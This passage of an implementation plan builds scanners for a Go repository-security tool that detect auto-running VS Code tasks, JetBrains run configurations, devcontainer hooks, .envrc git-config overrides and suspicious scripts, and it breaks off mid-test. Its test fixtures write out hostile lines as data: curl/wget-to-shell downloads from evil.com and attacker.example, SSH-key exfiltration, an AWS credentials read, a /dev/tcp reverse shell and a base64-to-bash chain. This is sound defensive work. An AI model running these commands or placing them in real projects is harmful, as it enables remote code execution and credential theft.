Create `internal/scanner/ideconfigs_test.go`:

```go
package scanner_test

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"testing"

	"github.com/moldabekov/git-protect/internal/scanner"
)

// writeJSON writes v as JSON to the given path, creating parent directories.
func writeJSON(t *testing.T, path string, v any) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0755); err != nil {
		t.Fatal(err)
	}
	data, err := json.Marshal(v)
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, data, 0644); err != nil {
		t.Fatal(err)
	}
}

func TestIDEConfigs_NoIDEFiles(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "main.go"), []byte("package main"), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewIDEConfigsModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("got %d findings, want 0", len(findings))
	}
}

func TestIDEConfigs_VSCodeTaskFolderOpen(t *testing.T) {
	dir := t.TempDir()
	tasks := map[string]any{
		"version": "2.0.0",
		"tasks": []map[string]any{
			{
				"label":   "Setup",
				"type":    "shell",
				"command": "curl http://evil.com/init.sh | bash",
				"runOptions": map[string]any{
					"runOn": "folderOpen",
				},
			},
		},
	}
	writeJSON(t, filepath.Join(dir, ".vscode", "tasks.json"), tasks)

	m := scanner.NewIDEConfigsModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) == 0 {
		t.Fatal("expected finding for folderOpen task, got none")
	}
	if findings[0].Severity != scanner.High {
		t.Errorf("severity = %v, want HIGH", findings[0].Severity)
	}
}

func TestIDEConfigs_VSCodeTaskNoFolderOpen(t *testing.T) {
	// A tasks.json without runOn:folderOpen is not auto-executing.
	dir := t.TempDir()
	tasks := map[string]any{
		"version": "2.0.0",
		"tasks": []map[string]any{
			{
				"label":   "Build",
				"type":    "shell",
				"command": "go build ./...",
			},
		},
	}
	writeJSON(t, filepath.Join(dir, ".vscode", "tasks.json"), tasks)

	m := scanner.NewIDEConfigsModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("got %d findings for safe task, want 0", len(findings))
	}
}

func TestIDEConfigs_VSCodeDangerousSettings(t *testing.T) {
	dir := t.TempDir()
	settings := map[string]any{
		"git.path":          "/tmp/malicious-git",
		"editor.fontSize":   14,
		"python.pythonPath": "/tmp/evil-python",
	}
	writeJSON(t, filepath.Join(dir, ".vscode", "settings.json"), settings)

	m := scanner.NewIDEConfigsModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) == 0 {
		t.Fatal("expected findings for dangerous settings, got none")
	}
	for _, f := range findings {
		if f.Severity != scanner.High {
			t.Errorf("severity = %v, want HIGH", f.Severity)
		}
	}
}

func TestIDEConfigs_VSCodeSafeSettings(t *testing.T) {
	dir := t.TempDir()
	settings := map[string]any{
		"editor.tabSize":  4,
		"editor.fontSize": 14,
		"files.autoSave":  "onFocusChange",
	}
	writeJSON(t, filepath.Join(dir, ".vscode", "settings.json"), settings)

	m := scanner.NewIDEConfigsModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("safe settings got %d findings, want 0", len(findings))
	}
}

func TestIDEConfigs_IntelliJRunManager(t *testing.T) {
	dir := t.TempDir()
	if err := os.MkdirAll(filepath.Join(dir, ".idea"), 0755); err != nil {
		t.Fatal(err)
	}
	xmlContent := `<?xml version="1.0" encoding="UTF-8"?>
<project version="4">
  <component name="RunManager" selected="Application.Main">
    <configuration name="Main" type="Application" factoryName="Application">
      <option name="MAIN_CLASS_NAME" value="com.example.Main" />
    </configuration>
  </component>
</project>`
	xmlPath := filepath.Join(dir, ".idea", "workspace.xml")
	if err := os.WriteFile(xmlPath, []byte(xmlContent), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewIDEConfigsModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) == 0 {
		t.Fatal("expected finding for JetBrains RunManager, got none")
	}
	if findings[0].Severity != scanner.High {
		t.Errorf("severity = %v, want HIGH", findings[0].Severity)
	}
}

func TestIDEConfigs_IntelliJSafeXML(t *testing.T) {
	dir := t.TempDir()
	if err := os.MkdirAll(filepath.Join(dir, ".idea"), 0755); err != nil {
		t.Fatal(err)
	}
	xmlContent := `<?xml version="1.0" encoding="UTF-8"?>
<project version="4">
  <component name="ProjectModuleManager">
    <modules><module /></modules>
  </component>
</project>`
	if err := os.WriteFile(filepath.Join(dir, ".idea", "modules.xml"), []byte(xmlContent), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewIDEConfigsModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("safe .idea XML got %d findings, want 0", len(findings))
	}
}

func TestIDEConfigs_Name(t *testing.T) {
	m := scanner.NewIDEConfigsModule()
	if m.Name() != "ide-configs" {
		t.Errorf("Name() = %q, want %q", m.Name(), "ide-configs")
	}
}
```

### Step 2: Run tests to verify they fail

```bash
cd /home/moldabekov/Work/Projects/git/git-protect
go test ./internal/scanner/ -run TestIDEConfigs -v 2>&1 | head -20
```

Expected: compilation error — `NewIDEConfigsModule` not defined.

### Step 3: Implement the IDE configs scanner

Create `internal/scanner/ideconfigs.go`:

```go
package scanner

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

// IDEConfigsModule detects IDE configuration files that auto-execute commands.
// Severity: HIGH — actively weaponized in the Contagious Interview campaign (2025-2026).
type IDEConfigsModule struct{}

// NewIDEConfigsModule returns a new IDEConfigsModule.
func NewIDEConfigsModule() *IDEConfigsModule {
	return &IDEConfigsModule{}
}

// Name returns the module identifier.
func (m *IDEConfigsModule) Name() string { return "ide-configs" }

// dangerousVSCodeSettings is the set of VS Code settings keys that, when set by
// a repo's .vscode/settings.json, redirect extension tooling to attacker-controlled
// binaries. Keys are lowercased for case-insensitive comparison.
var dangerousVSCodeSettings = []string{
	"git.path",
	"python.pythonpath",
	"python.defaultinterpreterpath",
	"terminal.integrated.shell.linux",
	"terminal.integrated.shell.osx",
	"terminal.integrated.shell.windows",
	"terminal.integrated.defaultprofile.linux",
	"terminal.integrated.defaultprofile.osx",
	"terminal.integrated.defaultprofile.windows",
	"eslint.nodepath",
	"prettier.prettierpath",
	"go.alternatetools",
	"go.gopath",
	"go.goroot",
	"rust-analyzer.server.path",
	"java.home",
	"maven.executable.path",
}

// Scan checks for dangerous IDE configuration files in the repository.
func (m *IDEConfigsModule) Scan(_ context.Context, sc ScanContext) ([]Finding, error) {
	var findings []Finding

	vscodeTasks := filepath.Join(sc.RepoPath, ".vscode", "tasks.json")
	if f, err := scanVSCodeTasks(vscodeTasks); err == nil {
		findings = append(findings, f...)
	}

	vscodeSettings := filepath.Join(sc.RepoPath, ".vscode", "settings.json")
	if f, err := scanVSCodeSettings(vscodeSettings); err == nil {
		findings = append(findings, f...)
	}

	ideaDir := filepath.Join(sc.RepoPath, ".idea")
	if f, err := scanIntelliJDir(ideaDir); err == nil {
		findings = append(findings, f...)
	}

	return findings, nil
}

// scanVSCodeTasks checks .vscode/tasks.json for tasks with runOn:folderOpen.
func scanVSCodeTasks(path string) ([]Finding, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err // File does not exist or is unreadable; not an error condition.
	}

	// Parse as a generic map so we handle arbitrary task shapes without a rigid schema.
	var root map[string]json.RawMessage
	if err := json.Unmarshal(data, &root); err != nil {
		return nil, fmt.Errorf("ide-configs: tasks.json parse error: %w", err)
	}

	tasksRaw, ok := root["tasks"]
	if !ok {
		return nil, nil
	}

	var tasks []json.RawMessage
	if err := json.Unmarshal(tasksRaw, &tasks); err != nil {
		return nil, nil
	}

	var findings []Finding
	for i, taskRaw := range tasks {
		var task map[string]json.RawMessage
		if err := json.Unmarshal(taskRaw, &task); err != nil {
			continue
		}

		runOptionsRaw, hasRunOptions := task["runOptions"]
		if !hasRunOptions {
			continue
		}

		var runOptions map[string]json.RawMessage
		if err := json.Unmarshal(runOptionsRaw, &runOptions); err != nil {
			continue
		}

		runOnRaw, hasRunOn := runOptions["runOn"]
		if !hasRunOn {
			continue
		}

		var runOn string
		if err := json.Unmarshal(runOnRaw, &runOn); err != nil {
			continue
		}

		if strings.EqualFold(runOn, "folderOpen") {
			label := fmt.Sprintf("task[%d]", i)
			if labelRaw, ok := task["label"]; ok {
				_ = json.Unmarshal(labelRaw, &label)
			}
			findings = append(findings, Finding{
				Severity: High,
				Module:   "ide-configs",
				Path:     ".vscode/tasks.json",
				Message:  fmt.Sprintf("VS Code task %q has runOn:folderOpen — auto-executes on folder open", label),
				Detail:   "Tasks with runOn:folderOpen execute automatically when a developer opens the project in VS Code.",
			})
		}
	}

	return findings, nil
}

// scanVSCodeSettings checks .vscode/settings.json for dangerous key overrides.
func scanVSCodeSettings(path string) ([]Finding, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}

	var settings map[string]json.RawMessage
	if err := json.Unmarshal(data, &settings); err != nil {
		return nil, fmt.Errorf("ide-configs: settings.json parse error: %w", err)
	}

	var findings []Finding
	for key := range settings {
		for _, dangerous := range dangerousVSCodeSettings {
			if strings.EqualFold(key, dangerous) {
				findings = append(findings, Finding{
					Severity: High,
					Module:   "ide-configs",
					Path:     ".vscode/settings.json",
					Message:  fmt.Sprintf("VS Code setting %q overrides tool path — can redirect to attacker-controlled binary", key),
					Detail:   "Repo-local VS Code settings can redirect the interpreter, shell, or tool used by extensions to an arbitrary binary.",
				})
				break
			}
		}
	}

	return findings, nil
}

// scanIntelliJDir walks .idea/ and checks XML files for RunManager components.
func scanIntelliJDir(ideaDir string) ([]Finding, error) {
	entries, err := os.ReadDir(ideaDir)
	if err != nil {
		return nil, err // Directory does not exist; not an error.
	}

	var findings []Finding
	for _, entry := range entries {
		if entry.IsDir() || !strings.HasSuffix(entry.Name(), ".xml") {
			continue
		}
		xmlPath := filepath.Join(ideaDir, entry.Name())
		data, err := os.ReadFile(xmlPath)
		if err != nil {
			continue
		}

		if bytes.Contains(data, []byte(`name="RunManager"`)) {
			relPath := filepath.Join(".idea", entry.Name())
			findings = append(findings, Finding{
				Severity: High,
				Module:   "ide-configs",
				Path:     relPath,
				Message:  fmt.Sprintf("JetBrains .idea/%s contains RunManager component — defines auto-run configurations", entry.Name()),
				Detail:   "JetBrains IDEs load run configurations from .idea/ workspace XML files automatically. Used in Contagious Interview campaign to execute malicious code on project open.",
			})
		}
	}

	return findings, nil
}
```

### Step 4: Run tests to verify they pass

```bash
cd /home/moldabekov/Work/Projects/git/git-protect
go test ./internal/scanner/ -run TestIDEConfigs -v
```

Expected: all PASS.

### Step 5: Commit

```bash
cd /home/moldabekov/Work/Projects/git/git-protect
git add internal/scanner/ideconfigs.go internal/scanner/ideconfigs_test.go
git commit -m "feat: ide-configs scanner -- detect VS Code folderOpen tasks, dangerous settings, JetBrains RunManager (HIGH)"
```

---

## Task 12: Devenv Scanner

**Files:** `internal/scanner/devenv.go`, `internal/scanner/devenv_test.go`

Detects dev environment files that auto-execute on clone or directory entry.

Severity:
- `.devcontainer/devcontainer.json` lifecycle hooks (`postCreateCommand`, `postStartCommand`, `postAttachCommand`, `onCreateCommand`, `updateContentCommand`) — HIGH
- `.envrc` presence — HIGH
- `.envrc` with `GIT_CONFIG_*` variables — CRITICAL (bypasses all config-based protections)

### Step 1: Write the test file first

Create `internal/scanner/devenv_test.go`:

```go
package scanner_test

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"testing"

	"github.com/moldabekov/git-protect/internal/scanner"
)

func TestDevenv_NoDevenvFiles(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "main.go"), []byte("package main"), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewDevenvModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("got %d findings, want 0", len(findings))
	}
}

func TestDevenv_DevcontainerWithLifecycleHooks(t *testing.T) {
	dir := t.TempDir()
	if err := os.MkdirAll(filepath.Join(dir, ".devcontainer"), 0755); err != nil {
		t.Fatal(err)
	}
	cfg := map[string]any{
		"name":              "Dev Container",
		"image":             "mcr.microsoft.com/devcontainers/go:1.22",
		"postCreateCommand": "curl http://evil.com/init.sh | bash",
		"postStartCommand":  "node /tmp/evil.js",
	}
	data, _ := json.Marshal(cfg)
	if err := os.WriteFile(filepath.Join(dir, ".devcontainer", "devcontainer.json"), data, 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewDevenvModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) == 0 {
		t.Fatal("expected findings for lifecycle hooks, got none")
	}
	for _, f := range findings {
		if f.Severity != scanner.High {
			t.Errorf("severity = %v, want HIGH", f.Severity)
		}
	}
}

func TestDevenv_DevcontainerNoHooks(t *testing.T) {
	dir := t.TempDir()
	if err := os.MkdirAll(filepath.Join(dir, ".devcontainer"), 0755); err != nil {
		t.Fatal(err)
	}
	cfg := map[string]any{
		"name":  "Dev Container",
		"image": "mcr.microsoft.com/devcontainers/go:1.22",
	}
	data, _ := json.Marshal(cfg)
	if err := os.WriteFile(filepath.Join(dir, ".devcontainer", "devcontainer.json"), data, 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewDevenvModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("devcontainer without hooks got %d findings, want 0", len(findings))
	}
}

func TestDevenv_EnvrcPresence(t *testing.T) {
	dir := t.TempDir()
	envrcContent := "export PATH=$PATH:/usr/local/bin\nlayout python3\n"
	if err := os.WriteFile(filepath.Join(dir, ".envrc"), []byte(envrcContent), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewDevenvModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) == 0 {
		t.Fatal("expected finding for .envrc presence, got none")
	}

	found := false
	for _, f := range findings {
		if f.Severity == scanner.High {
			found = true
		}
	}
	if !found {
		t.Error("expected at least one HIGH finding for .envrc")
	}
}

func TestDevenv_EnvrcWithGitConfigVars(t *testing.T) {
	dir := t.TempDir()
	// GIT_CONFIG_COUNT/KEY/VALUE can override any git config, including
	// core.hooksPath — bypassing all of git-protect's config-based defenses.
	envrcContent := "export GIT_CONFIG_COUNT=1\nexport GIT_CONFIG_KEY_0=core.hooksPath\nexport GIT_CONFIG_VALUE_0=/tmp/evil-hooks\n"
	if err := os.WriteFile(filepath.Join(dir, ".envrc"), []byte(envrcContent), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewDevenvModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	var hasCritical bool
	for _, f := range findings {
		if f.Severity == scanner.Critical {
			hasCritical = true
		}
	}
	if !hasCritical {
		t.Error("expected CRITICAL finding for GIT_CONFIG_* in .envrc")
	}
}

func TestDevenv_EnvrcWithGitConfigGlobal(t *testing.T) {
	dir := t.TempDir()
	// GIT_CONFIG_GLOBAL overrides the global git config file path entirely.
	envrcContent := "export GIT_CONFIG_GLOBAL=/tmp/evil.gitconfig\n"
	if err := os.WriteFile(filepath.Join(dir, ".envrc"), []byte(envrcContent), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewDevenvModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	var hasCritical bool
	for _, f := range findings {
		if f.Severity == scanner.Critical {
			hasCritical = true
		}
	}
	if !hasCritical {
		t.Error("expected CRITICAL finding for GIT_CONFIG_GLOBAL in .envrc")
	}
}

func TestDevenv_Name(t *testing.T) {
	m := scanner.NewDevenvModule()
	if m.Name() != "devenv" {
		t.Errorf("Name() = %q, want %q", m.Name(), "devenv")
	}
}
```

### Step 2: Run tests to verify they fail

```bash
cd /home/moldabekov/Work/Projects/git/git-protect
go test ./internal/scanner/ -run TestDevenv -v 2>&1 | head -20
```

Expected: compilation error — `NewDevenvModule` not defined.

### Step 3: Implement the devenv scanner

Create `internal/scanner/devenv.go`:

```go
package scanner

import (
	"bufio"
	"context"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

// DevenvModule detects dev environment files that auto-execute commands.
// .envrc with GIT_CONFIG_* variables: CRITICAL — bypasses all config-based protections.
// .envrc presence and devcontainer lifecycle hooks: HIGH.
type DevenvModule struct{}

// NewDevenvModule returns a new DevenvModule.
func NewDevenvModule() *DevenvModule {
	return &DevenvModule{}
}

// Name returns the module identifier.
func (m *DevenvModule) Name() string { return "devenv" }

// devcontainerLifecycleHooks is the set of devcontainer.json keys that execute
// arbitrary commands during container creation or start.
var devcontainerLifecycleHooks = []string{
	"onCreateCommand",
	"updateContentCommand",
	"postCreateCommand",
	"postStartCommand",
	"postAttachCommand",
	"initializeCommand",
}

// gitConfigEnvPrefixes are environment variable names/prefixes whose presence in
// an .envrc can override git configuration, bypassing git-protect's defenses.
var gitConfigEnvPrefixes = []string{
	"GIT_CONFIG_COUNT",
	"GIT_CONFIG_KEY_",
	"GIT_CONFIG_VALUE_",
	"GIT_CONFIG_GLOBAL",
	"GIT_CONFIG_SYSTEM",
	"GIT_CONFIG_NOSYSTEM",
}

// Scan checks for dangerous dev environment files.
func (m *DevenvModule) Scan(_ context.Context, sc ScanContext) ([]Finding, error) {
	var findings []Finding

	// Check .devcontainer/devcontainer.json for lifecycle hooks.
	devcontainerPath := filepath.Join(sc.RepoPath, ".devcontainer", "devcontainer.json")
	if f, err := scanDevcontainer(devcontainerPath); err == nil {
		findings = append(findings, f...)
	}

	// Check .envrc: presence (HIGH) and GIT_CONFIG_* (CRITICAL).
	envrcPath := filepath.Join(sc.RepoPath, ".envrc")
	if f, err := scanEnvrc(envrcPath); err == nil {
		findings = append(findings, f...)
	}

	return findings, nil
}

// scanDevcontainer checks devcontainer.json for lifecycle hook fields.
func scanDevcontainer(path string) ([]Finding, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err // File does not exist; not an error.
	}

	var cfg map[string]json.RawMessage
	if err := json.Unmarshal(data, &cfg); err != nil {
		return nil, fmt.Errorf("devenv: devcontainer.json parse error: %w", err)
	}

	var findings []Finding
	for _, hook := range devcontainerLifecycleHooks {
		raw, ok := cfg[hook]
		if !ok {
			continue
		}

		// The hook value can be a string or an array of strings; capture its raw form.
		hookValue := strings.Trim(string(raw), `"`)
		findings = append(findings, Finding{
			Severity: High,
			Module:   "devenv",
			Path:     ".devcontainer/devcontainer.json",
			Message:  fmt.Sprintf("devcontainer lifecycle hook %q executes: %s", hook, truncate(hookValue, 80)),
			Detail:   "devcontainer lifecycle hooks run automatically when a Codespace or dev container is created/started. postCreateCommand is frequently abused to exfiltrate GITHUB_TOKEN.",
		})
	}

	return findings, nil
}

// scanEnvrc checks .envrc for its presence (HIGH) and for GIT_CONFIG_* variable
// exports (CRITICAL). direnv auto-executes .envrc on 'cd' into the directory.
func scanEnvrc(path string) ([]Finding, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err // File does not exist; not an error.
	}
	defer f.Close()

	var findings []Finding

	// The mere presence of .envrc is HIGH: direnv auto-executes it on cd.
	findings = append(findings, Finding{
		Severity: High,
		Module:   "devenv",
		Path:     ".envrc",
		Message:  ".envrc present — direnv will auto-execute this file when entering the directory",
		Detail:   "direnv runs .envrc automatically when a shell enters the directory. Any shell command in .envrc executes without further confirmation.",
	})

	// Additionally scan for GIT_CONFIG_* environment variable exports.
	sc := bufio.NewScanner(f)
	lineNum := 0
	for sc.Scan() {
		lineNum++
		line := strings.TrimSpace(sc.Text())

		// Skip comments and empty lines.
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}

		// Look for export statements that set GIT_CONFIG_* variables.
		varName := extractEnvVarName(line)
		if varName == "" {
			continue
		}

		for _, prefix := range gitConfigEnvPrefixes {
			if strings.HasPrefix(strings.ToUpper(varName), prefix) {
				findings = append(findings, Finding{
					Severity: Critical,
					Module:   "devenv",
					Path:     ".envrc",
					Message:  fmt.Sprintf(".envrc line %d sets %s — overrides git configuration, bypassing all config-based protections", lineNum, varName),
					Detail:   "GIT_CONFIG_COUNT/KEY/VALUE, GIT_CONFIG_GLOBAL, and GIT_CONFIG_SYSTEM environment variables override git config at all scopes, including git-protect's hardened global settings (core.hooksPath, core.fsmonitor, etc.).",
				})
				break
			}
		}
	}

	if err := sc.Err(); err != nil {
		return findings, fmt.Errorf("devenv: .envrc read error: %w", err)
	}

	return findings, nil
}

// extractEnvVarName returns the variable name from a shell assignment or export
// statement, e.g. "export FOO=bar" returns "FOO", "FOO=bar" returns "FOO".
func extractEnvVarName(line string) string {
	// Strip "export" keyword.
	line = strings.TrimPrefix(line, "export ")
	line = strings.TrimSpace(line)

	// Variable name is everything before '='.
	eqIdx := strings.IndexByte(line, '=')
	if eqIdx <= 0 {
		return ""
	}
	name := line[:eqIdx]
	// Validate: variable names are [A-Za-z_][A-Za-z0-9_]*
	for _, ch := range name {
		if !isIDChar(ch) {
			return ""
		}
	}
	return name
}

func isIDChar(ch rune) bool {
	return (ch >= 'A' && ch <= 'Z') || (ch >= 'a' && ch <= 'z') ||
		(ch >= '0' && ch <= '9') || ch == '_'
}

// truncate returns s with a maximum length of n, appending "..." if truncated.
func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "..."
}
```

### Step 4: Run tests to verify they pass

```bash
cd /home/moldabekov/Work/Projects/git/git-protect
go test ./internal/scanner/ -run TestDevenv -v
```

Expected: all PASS.

### Step 5: Commit

```bash
cd /home/moldabekov/Work/Projects/git/git-protect
git add internal/scanner/devenv.go internal/scanner/devenv_test.go
git commit -m "feat: devenv scanner -- devcontainer hooks (HIGH), .envrc presence (HIGH), GIT_CONFIG_* bypass (CRITICAL)"
```

---

## Task 13: Scripts Scanner

**Files:** `internal/scanner/scripts.go`, `internal/scanner/scripts_test.go`

Heuristic scan of shell, Python, and JavaScript files for exfiltration and reverse-shell patterns.

Severity: MEDIUM. Skips `.git/`, `node_modules/`, `vendor/`. Skips files larger than 1 MB.

### Step 1: Write the test file first

Create `internal/scanner/scripts_test.go`:

```go
package scanner_test

import (
	"context"
	"os"
	"path/filepath"
	"testing"

	"github.com/moldabekov/git-protect/internal/scanner"
)

func TestScripts_NoScripts(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "README.md"), []byte("# Project"), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewScriptsModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("got %d findings, want 0", len(findings))
	}
}

func TestScripts_CurlPipeShell(t *testing.T) {
	dir := t.TempDir()
	script := "#!/bin/bash\n# Install dependencies\ncurl -fsSL http://evil.com/install.sh | sh\necho done\n"
	if err := os.WriteFile(filepath.Join(dir, "setup.sh"), []byte(script), 0755); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewScriptsModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) == 0 {
		t.Fatal("expected finding for curl|sh, got none")
	}
	if findings[0].Severity != scanner.Medium {
		t.Errorf("severity = %v, want MEDIUM", findings[0].Severity)
	}
}

func TestScripts_WgetPipeBash(t *testing.T) {
	dir := t.TempDir()
	script := "#!/bin/bash\nwget -O- http://attacker.example/payload | bash\n"
	if err := os.WriteFile(filepath.Join(dir, "install.sh"), []byte(script), 0755); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewScriptsModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) == 0 {
		t.Fatal("expected finding for wget|bash, got none")
	}
}

func TestScripts_CredentialAccess_SSHKey(t *testing.T) {
	dir := t.TempDir()
	script := "#!/usr/bin/env python3\nimport os, requests\nkey = open(os.path.expanduser('~/.ssh/id_rsa')).read()\nrequests.post('http://evil.com/collect', data=key)\n"
	if err := os.WriteFile(filepath.Join(dir, "helper.py"), []byte(script), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewScriptsModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) == 0 {
		t.Fatal("expected finding for ~/.ssh/id_rsa access, got none")
	}
}

func TestScripts_CredentialAccess_AWSCreds(t *testing.T) {
	dir := t.TempDir()
	script := "const fs = require('fs');\nconst creds = fs.readFileSync(process.env.HOME + '/.aws/credentials', 'utf8');\n"
	if err := os.WriteFile(filepath.Join(dir, "init.js"), []byte(script), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewScriptsModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) == 0 {
		t.Fatal("expected finding for ~/.aws/credentials access, got none")
	}
}

func TestScripts_ReverseShell(t *testing.T) {
	dir := t.TempDir()
	// bash reverse shell using /dev/tcp
	script := "#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n"
	if err := os.WriteFile(filepath.Join(dir, "connect.sh"), []byte(script), 0755); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewScriptsModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) == 0 {
		t.Fatal("expected finding for /dev/tcp/ reverse shell, got none")
	}
}

func TestScripts_Base64DecodeChain(t *testing.T) {
	dir := t.TempDir()
	script := "#!/bin/bash\necho 'aGVsbG8=' | base64 -d | bash\n"
	if err := os.WriteFile(filepath.Join(dir, "run.sh"), []byte(script), 0755); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewScriptsModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) == 0 {
		t.Fatal("expected finding for base64 decode chain, got none")
	}
}

func TestScripts_EnvTokenAccess(t *testing.T) {
	dir := t.TempDir()
	// Script that reads $GITHUB_TOKEN
	script := "#!/bin/bash\nTOKEN=$GITHUB_TOKEN\necho \"token: $TOKEN\"\n"
	if err := os.WriteFile(filepath.Join(dir, "post.sh"), []byte(script), 0755); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewScriptsModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) == 0 {
		t.Fatal("expected finding for $GITHUB_TOKEN access, got none")
	}
}

func TestScripts_SafeScript(t *testing.T) {
	dir := t.TempDir()
	script := "#!/bin/bash\nset -euo pipefail\necho 'Building project...'\ngo build ./...\necho 'Running tests...'\ngo test ./...\necho 'Done.'\n"
	if err := os.WriteFile(filepath.Join(dir, "build.sh"), []byte(script), 0755); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewScriptsModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("safe script got %d findings, want 0", len(findings))
	}
}

func TestScripts_SkipsNodeModules(t *testing.T) {
	dir := t.TempDir()
	nmDir := filepath.Join(dir, "node_modules", "evil-pkg")
	if err := os.MkdirAll(nmDir, 0755); err != nil {
		t.Fatal(err)
	}
	script := "curl http://evil.com | sh\n"
	if err := os.WriteFile(filepath.Join(nmDir, "install.sh"), []byte(script), 0755); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewScriptsModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("node_modules should be skipped, got %d findings", len(findings))
	}
}

func TestScripts_SkipsLargeFiles(t *testing.T) {
	dir := t.TempDir()
	// Create a file larger than 1 MB with a suspicious pattern at the end.
	large := make([]byte, 1024*1024+100)
	for i := range large {
		large[i] = 'a'
	}
	copy(large[len(large)-30:], []byte("\ncurl http://x.com | sh\n"))
	if err := os.WriteFile(filepath.Join(dir, "large.sh"), large, 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewScriptsModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
